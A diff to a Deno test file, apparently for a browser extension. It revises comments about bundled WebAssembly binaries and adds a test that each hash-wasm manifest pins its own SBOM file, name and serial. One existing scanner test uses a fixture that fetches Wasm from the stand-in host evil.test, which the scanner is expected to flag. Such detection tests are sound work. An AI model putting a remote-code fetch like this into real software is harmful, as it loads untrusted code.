@@ -8,7 +8,7 @@
 //
 // It reads tracked source as DATA and has no import edge to what it inspects — exactly the shape a
 // subset gate cannot see — so it is registered in SOURCE_INSPECTING_GUARDS (part of ALWAYS_ON) in
-// scripts/select-tests.mjs. Static file reads and 25 CAS binary hashes: no browser, no spawn, no build
+// scripts/select-tests.mjs. Static file reads and CAS binary hashes: no browser, no spawn, no build
 // precondition (it skips extension/dist). Do not fold it back into the original file, and do not
 // promote that file whole.
 // @ts-nocheck
@@ -34,8 +34,10 @@ Deno.test("wasm static/RHC boundary: no route, execution, owner, OPFS, network o
     }
   };
   await walk(fileURLToPath(new URL("../extension", import.meta.url)));
-  // Since 0.2.157 the bundled lane PHYSICALLY SHIPS the 25 reviewed binaries
-  // (inventory-only; still no route/execution). The successor invariant: the
+  // Since 0.2.157 the bundled lane PHYSICALLY SHIPS the reviewed binaries
+  // (inventory-only; still no route/execution) - the COUNT is deliberately not
+  // written down: this test asserts the set is exactly the inventory's, so a
+  // literal here only rots. The successor invariant: the
   // shipped set is EXACTLY the inventory's declared CAS set — no more, no
   // less — and every byte hashes to its pinned content address.
   const { BUNDLED_INVENTORY } = await import("../extension/lib/bundled-inventory-data.js");
@@ -55,4 +57,46 @@ Deno.test("wasm static/RHC boundary: no route, execution, owner, OPFS, network o
   assert(dynamic.some((row) => row.includes("dynamic WebAssembly")));
   const fetched = await scanShippedJs(["fetch.js"], { readText: async () => 'fetch("https://evil.test/x.wasm")' });
   assert(fetched.some((row) => row.includes("network Wasm")));
+});
+
+// The per-tool SBOM identity was unpinned (chrome-agent-platform-10z9): the manifests are what a
+// licence disclosure reads, and nothing asserted that a hash-wasm package's CycloneDX identity names
+// the hash-wasm component for THAT algorithm rather than a generic or shared one. A shared serial or
+// a wrong component name would make two reviewed binaries indistinguishable in a notice file, and no
+// gate would say so. This reads the tracked manifests and the CDX files they pin as data.
+Deno.test("wasm-package-authority-static: every hash-wasm manifest pins its own SBOM component name and serial", async () => {
+  const dir = new URL("../extension/wasm/manifests/", import.meta.url);
+  const rows: { id: string; algo: string; ref: string; name: string; serial: string }[] = [];
+  for await (const entry of Deno.readDir(dir)) {
+    if (!entry.isFile || !entry.name.startsWith("cap.bundled.hash.") || !entry.name.endsWith(".manifest.json")) continue;
+    const manifest = JSON.parse(await Deno.readTextFile(new URL(entry.name, dir)));
+    const id = String(manifest?.package?.id ?? "");
+    const sbom = manifest?.sbom ?? {};
+    assert(typeof sbom.ref === "string" && typeof sbom.sha256 === "string", `${entry.name}: the manifest pins an sbom ref and digest`);
+    const cdxBytes = await Deno.readFile(new URL(`../${sbom.ref}`, import.meta.url));
+    assertEquals(
+      hex(new Uint8Array(await crypto.subtle.digest("SHA-256", cdxBytes))),
+      sbom.sha256,
+      `${entry.name}: the pinned digest is the referenced CDX's bytes`,
+    );
+    const cdx = JSON.parse(new TextDecoder().decode(cdxBytes));
+    rows.push({
+      id,
+      // hash-wasm's module names spell `sha3.256` as `sha3_256`, and the CDX file name and its
+      // component name agree on that spelling (verified across all fourteen at filing time), so the
+      // id is normalised rather than compared literally - the tree, not a guess, decides the form.
+      algo: id.replace("cap.bundled.hash.", "").replace(/[.-]/g, "_"),
+      ref: sbom.ref,
+      name: String(cdx?.metadata?.component?.name ?? ""),
+      serial: String(cdx?.serialNumber ?? ""),
+    });
+  }
+  assert(rows.length >= 14, `the reviewed hash-wasm family is present (found ${rows.length})`);
+  for (const row of rows) {
+    assertEquals(row.name, `hashwasm-${row.algo}`, `${row.id}: the SBOM component names this algorithm's hash-wasm package, not a generic one`);
+    assertEquals(row.ref, `extension/wasm/sbom/hash_${row.algo}.cdx.json`, `${row.id}: the manifest pins ITS OWN tool's CDX, not a sibling's`);
+    assert(/^urn:uuid:[0-9a-f-]{36}$/.test(row.serial), `${row.id}: serialNumber is a URN uuid (got ${JSON.stringify(row.serial)})`);
+  }
+  assertEquals(new Set(rows.map((r) => r.serial)).size, rows.length, "each reviewed binary carries its own SBOM serial");
+  assertEquals(new Set(rows.map((r) => r.ref)).size, rows.length, "each manifest pins its own CDX file");
 });
